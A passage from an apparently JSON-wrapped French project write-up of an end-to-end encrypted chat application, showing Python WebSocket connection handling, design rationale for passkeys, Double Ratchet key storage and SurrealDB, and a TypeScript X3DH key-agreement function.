websocket.close()\n        return False\n\n    self.active_connections[user_id].append(websocket)\n\n    try:\n        await presence_service.set_user_online(user_id)\n    except Exception as e:\n        await self._send_error(websocket, \"database_error\", \"Failed to initialize connection\")\n        self.active_connections[user_id].remove(websocket)\n        if not self.active_connections[user_id]:\n            del self.active_connections[user_id]\n        await websocket.close()\n        return False\n\n    self.heartbeat_tasks[user_id] = asyncio.create_task(\n        self._heartbeat_loop(websocket, user_id)\n    )\n\n    await self._subscribe_to_messages(user_id)\n    return True\n```\n\nLa gestion de connexion gère les scénarios multi-appareils, applique les limites, initialise le suivi de présence, démarre la boucle heartbeat et souscrit aux requêtes live SurrealDB pour messages entrants, tout atomiquement avec nettoyage propre sur n'importe quel échec.\n\n### Décisions Techniques\n\n**Paires de clés duales X25519 + Ed25519 pour identité**: Le protocole nécessite à la fois accord de clés (pour opérations DH) et signature (pour authentification prekey). Plutôt que d'utiliser une seule courbe avec transformations, maintenir des paires de clés X25519 et Ed25519 séparées est plus propre et évite des pièges cryptographiques subtils.\n\n**SurrealDB pour données temps réel**: PostgreSQL avec LISTEN/NOTIFY fonctionnerait, mais les requêtes live natives de SurrealDB éliminent le besoin d'une couche pub/sub séparée. Le compromis est la complexité opérationnelle d'exécuter une base de données plus récente, mais l'expérience développeur pour les fonctionnalités temps réel est significativement meilleure.\n\n**Stratégie d'éviction de clé de message sautée**: Le Double Ratchet doit stocker les clés pour messages arrivant hors ordre, mais le stockage non borné permet les attaques DoS. L'implémentation utilise un maximum configurable (1000 clés) avec éviction FIFO, équilibrant fiabilité contre épuisement de ressources.\n\n**WebAuthn avec credentials découvrables**: Les passkeys sont configurées comme résidentes/découvrables, signifiant que l'authentificateur stocke le credential et l'utilisateur n'a pas besoin de fournir un nom d'utilisateur. Cela permet une vraie authentification à geste unique sur appareils avec authentificateurs de plateforme.\n\n**Vérification de compteur de signature**: Chaque authentification WebAuthn incrémente un compteur stocké sur l'authentificateur. Le serveur suit ceci et rejette les authentifications où le compteur n'augmente pas, détectant les authentificateurs clonés.\n\n**Redis pour stockage de challenge avec get-and-delete atomique**: Les challenges WebAuthn sont à usage unique et limités dans le temps. Utiliser des pipelines Redis pour récupérer et supprimer atomiquement les challenges prévient les attaques par rejeu sans conditions de course.\n\n```typescript\nasync function initiateX3DH(\n  identityKeyPair: IdentityKeyPair,\n  recipientBundle: PreKeyBundle\n): Promise<X3DHResult> {\n  const signatureValid = await verifySignedPreKey(\n    recipientBundle.identity_key,\n    recipientBundle.signed_prekey,\n    recipientBundle.signed_prekey_signature\n  )\n\n  if (!signatureValid) {\n    throw new Error(\"Invalid signed prekey signature\")\n  }\n\n  const ephemeralKeyPair = await generateX25519KeyPair()\n  const ephemeralPublic = await exportPublicKey(ephemeralKeyPair.publicKey)\n\n  const senderIdentityPrivate = await importX25519PrivateKey(\n    base64ToBytes(identityKeyPair.x25519_private)\n  )\n  const recipientIdentityPublic = await importX25519PublicKey(\n    base64ToBytes(recipientBundle.identity_key)\n  )\n  const recipientSignedPreKeyPublic = await importX25519PublicKey(\n    base64ToBytes(recipientBundle.signed_prekey)\n  )\n\n  const dh1 = await x25519DeriveSharedSecret(senderIdentityPrivate, recipientSignedPreKeyPublic)\n  const dh2 = await x25519DeriveSharedSecret(ephemeralKeyPair.privateKey, recipientIdentityPublic)\n  const dh3 = await x25519DeriveSharedSecret(ephemeralKeyPair.privateKey, recipientSignedPreKeyPublic)\n\n  let dhResults: Uint8Array[]\n  let usedOneTimePreKey = false\n\n  if (recipientBundle.one_time_prekey) {\n    const recipientOneTimePreKeyPublic = await importX25519PublicKey(\n      base64ToBytes(recipientBundle.one_time_prekey)\n    )\n    const dh4 = await x25519DeriveSharedSecret(ephemeralKeyPair.privateKey, recipientOneTimePreKeyPublic)\n    dhResults = [dh1, dh2, dh3, dh4]\n    usedOneTimePreKey = true\n  } else {\n    dhResults = [dh1, dh2, dh3]\n  }\n\n  const concatenated = concatBytes(...dhResults)\n  const sharedKey = await hkdfDerive(concatenated, EMPTY_SALT, X3DH_INFO, 32)\n\n  const senderIdentityPublic = base64ToBytes(identityKeyPair.x25519_public)\n  const recipientIdentityBytes = base64ToBytes(recipientBundle.identity_key)\n  const associatedData = concatBytes(senderIdentityPublic, recipientIdentityBytes)\n\n  return {\n    shared_key: sharedKey,\n    associated_data: associatedData,\n    ephemeral_public_key: bytesToBase64(ephemeralPublic),\n    used_one_time_prekey: usedOneTimePreKey,\n  }\n}\n```\n\nLe flux émetteur X3DH complet: vérifier la prekey signée pour prévenir les attaques MITM, générer une paire de clés éphémère fraîche, effectuer trois ou quatre opérations DH selon la disponibilité de prekey à usage unique, concaténer et passer par HKDF pour le secret partagé final. Les données associées liant les deux clés d'identité dans le contexte de chiffrement prévient les attaques de compromission d'impersonation de clé.\n\n### Stack\nPython 3.13, FastAPI, SQLModel, PostgreSQL, SurrealDB, Redis, WebAuthn (py_webauthn), cryptography, SolidJS, TypeScript, Tailwind CSS, Nanostores, Web Crypto API, Docker, Nginx\n"
}
